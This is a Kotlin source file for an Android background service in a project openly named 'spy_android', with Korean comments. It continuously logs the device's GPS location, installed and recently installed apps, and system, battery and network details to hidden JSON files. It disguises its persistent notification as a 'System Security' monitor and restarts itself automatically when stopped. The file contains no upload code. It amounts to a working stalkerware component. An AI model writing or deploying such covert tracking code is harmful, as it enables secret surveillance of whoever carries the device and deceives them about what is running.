package com.example.spy_android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.location.LocationManager
import android.location.LocationListener
import android.location.Location
import androidx.core.app.NotificationCompat
import android.util.Log
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import android.Manifest
import kotlinx.coroutines.*
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*
import com.google.gson.Gson

class BackgroundTrackingService : Service(), LocationListener {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val CHANNEL_ID = "SPY_TRACKING_SERVICE_CHANNEL"
    private val NOTIFICATION_ID = 1001

    private var locationManager: LocationManager? = null
    private var dataCollectionJob: Job? = null

    companion object {
        private const val TAG = "BackgroundTracking"
        var isServiceRunning = false
            private set
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        isServiceRunning = true
        Log.d(TAG, "백그라운드 추적 서비스 생성됨")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundService()
        startLocationTracking()
        startPeriodicDataCollection()

        Log.d(TAG, "백그라운드 추적 시작됨")
        return START_STICKY // 서비스가 종료되어도 자동 재시작
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopLocationTracking()
        dataCollectionJob?.cancel()
        serviceScope.cancel()
        isServiceRunning = false
        Log.d(TAG, "백그라운드 추적 서비스 종료됨")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Security Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System monitoring and security service"
                setShowBadge(false)
                setSound(null, null)
            }

            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security Active")
            .setContentText("Monitoring device for security purposes...")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)
            .setAutoCancel(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startLocationTracking() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "위치 권한이 없어 위치 추적을 시작할 수 없습니다")
            return
        }

        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

            // GPS와 네트워크 제공자 모두 사용
            val providers = listOf(
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER
            ).filter { provider ->
                locationManager?.isProviderEnabled(provider) == true
            }

            providers.forEach { provider ->
                try {
                    locationManager?.requestLocationUpdates(
                        provider,
                        30000, // 30초마다
                        10f,   // 10미터 이동시
                        this
                    )
                    Log.d(TAG, "위치 추적 시작됨: $provider")
                } catch (e: SecurityException) {
                    Log.e(TAG, "위치 추적 권한 오류: ${e.message}")
                } catch (e: Exception) {
                    Log.e(TAG, "위치 추적 시작 오류: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "LocationManager 초기화 오류: ${e.message}")
        }
    }

    private fun stopLocationTracking() {
        try {
            locationManager?.removeUpdates(this)
            Log.d(TAG, "위치 추적 중지됨")
        } catch (e: Exception) {
            Log.e(TAG, "위치 추적 중지 오류: ${e.message}")
        }
    }

    private fun startPeriodicDataCollection() {
        dataCollectionJob = serviceScope.launch {
            while (isActive) {
                try {
                    // 시스템 정보 수집
                    collectSystemInfo()

                    // 배터리 정보 수집
                    collectBatteryInfo()

                    // 네트워크 정보 수집
                    collectNetworkInfo()

                    // 앱 사용 정보 수집 (가능한 경우)
                    collectAppUsageInfo()

                    // 5분마다 실행
                    delay(5 * 60 * 1000)

                } catch (e: Exception) {
                    Log.e(TAG, "정기 데이터 수집 오류: ${e.message}")
                    delay(60 * 1000) // 오류시 1분 후 재시도
                }
            }
        }
    }

    override fun onLocationChanged(location: Location) {
        try {
            val locationData = mapOf(
                "provider" to location.provider,
                "latitude" to location.latitude,
                "longitude" to location.longitude,
                "accuracy" to location.accuracy,
                "altitude" to location.altitude,
                "speed" to location.speed,
                "bearing" to location.bearing,
                "timestamp" to location.time,
                "formatted_time" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date(location.time)),
                "collected_at" to System.currentTimeMillis()
            )

            saveDataToFile("location_tracking.json", locationData)
            Log.d(TAG, "위치 업데이트: ${location.latitude}, ${location.longitude}")

        } catch (e: Exception) {
            Log.e(TAG, "위치 데이터 저장 오류: ${e.message}")
        }
    }

    override fun onProviderEnabled(provider: String) {
        Log.d(TAG, "위치 제공자 활성화됨: $provider")
    }

    override fun onProviderDisabled(provider: String) {
        Log.d(TAG, "위치 제공자 비활성화됨: $provider")
    }

    @Deprecated("Deprecated in Java")
    override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {
        Log.d(TAG, "위치 제공자 상태 변경: $provider, 상태: $status")
    }

    private suspend fun collectSystemInfo() = withContext(Dispatchers.IO) {
        try {
            val systemInfo = mapOf(
                "event_type" to "system_info",
                "free_memory" to Runtime.getRuntime().freeMemory(),
                "total_memory" to Runtime.getRuntime().totalMemory(),
                "max_memory" to Runtime.getRuntime().maxMemory(),
                "processors" to Runtime.getRuntime().availableProcessors(),
                "timestamp" to System.currentTimeMillis(),
                "formatted_time" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date())
            )

            saveDataToFile("system_info.json", systemInfo)

        } catch (e: Exception) {
            Log.e(TAG, "시스템 정보 수집 오류: ${e.message}")
        }
    }

    private suspend fun collectBatteryInfo() = withContext(Dispatchers.IO) {
        try {
            val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))

            batteryIntent?.let { intent ->
                val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
                val temperature = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1)
                val voltage = intent.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, -1)
                val status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
                val health = intent.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1)

                val batteryInfo = mapOf(
                    "event_type" to "battery_info",
                    "level" to level,
                    "scale" to scale,
                    "percentage" to if (level != -1 && scale != -1) (level * 100 / scale) else -1,
                    "temperature" to temperature,
                    "voltage" to voltage,
                    "status" to status,
                    "health" to health,
                    "timestamp" to System.currentTimeMillis(),
                    "formatted_time" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .format(Date())
                )

                saveDataToFile("battery_info.json", batteryInfo)
            }

        } catch (e: Exception) {
            Log.e(TAG, "배터리 정보 수집 오류: ${e.message}")
        }
    }

    private suspend fun collectNetworkInfo() = withContext(Dispatchers.IO) {
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager

            val networkInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)

                mapOf(
                    "is_connected" to (network != null),
                    "has_wifi" to (capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true),
                    "has_cellular" to (capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true),
                    "has_ethernet" to (capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true),
                    "download_bandwidth" to (capabilities?.linkDownstreamBandwidthKbps ?: -1),
                    "upload_bandwidth" to (capabilities?.linkUpstreamBandwidthKbps ?: -1)
                )
            } else {
                @Suppress("DEPRECATION")
                val activeNetwork = connectivityManager.activeNetworkInfo
                mapOf(
                    "is_connected" to (activeNetwork?.isConnected == true),
                    "network_type" to (activeNetwork?.typeName ?: "Unknown"),
                    "is_roaming" to (activeNetwork?.isRoaming == true)
                )
            }

            val fullNetworkInfo = networkInfo.toMutableMap().apply {
                put("event_type", "network_info")
                put("timestamp", System.currentTimeMillis())
                put("formatted_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date()))
            }

            saveDataToFile("network_info.json", fullNetworkInfo)

        } catch (e: Exception) {
            Log.e(TAG, "네트워크 정보 수집 오류: ${e.message}")
        }
    }

    private suspend fun collectAppUsageInfo() = withContext(Dispatchers.IO) {
        try {
            val packageManager = packageManager
            val installedApps = packageManager.getInstalledApplications(0)

            val appsInfo = mapOf(
                "event_type" to "app_usage_info",
                "total_installed_apps" to installedApps.size,
                "system_apps" to installedApps.count { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 },
                "user_apps" to installedApps.count { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 },
                "recently_installed" to installedApps.filter { app ->
                    try {
                        val packageInfo = packageManager.getPackageInfo(app.packageName, 0)
                        val installTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
                            packageInfo.firstInstallTime
                        } else {
                            0L
                        }
                        val dayAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000)
                        installTime > dayAgo
                    } catch (e: Exception) {
                        false
                    }
                }.map { it.packageName },
                "timestamp" to System.currentTimeMillis(),
                "formatted_time" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date())
            )

            saveDataToFile("app_usage_info.json", appsInfo)

        } catch (e: Exception) {
            Log.e(TAG, "앱 사용 정보 수집 오류: ${e.message}")
        }
    }

    private fun saveDataToFile(fileName: String, data: Map<String, Any>) {
        try {
            val dataDir = File(filesDir, "spy_data")
            if (!dataDir.exists()) {
                dataDir.mkdirs()
            }

            val file = File(dataDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.write("${Gson().toJson(data)}\n")
            }

        } catch (e: Exception) {
            Log.e(TAG, "데이터 파일 저장 오류: ${e.message}")
        }
    }

    // 서비스 상태 확인용 메서드들
    fun getServiceStatus(): Map<String, Any> {
        return mapOf(
            "is_running" to isServiceRunning,
            "location_tracking" to (locationManager != null),
            "data_collection_active" to (dataCollectionJob?.isActive == true),
            "service_start_time" to System.currentTimeMillis()
        )
    }
}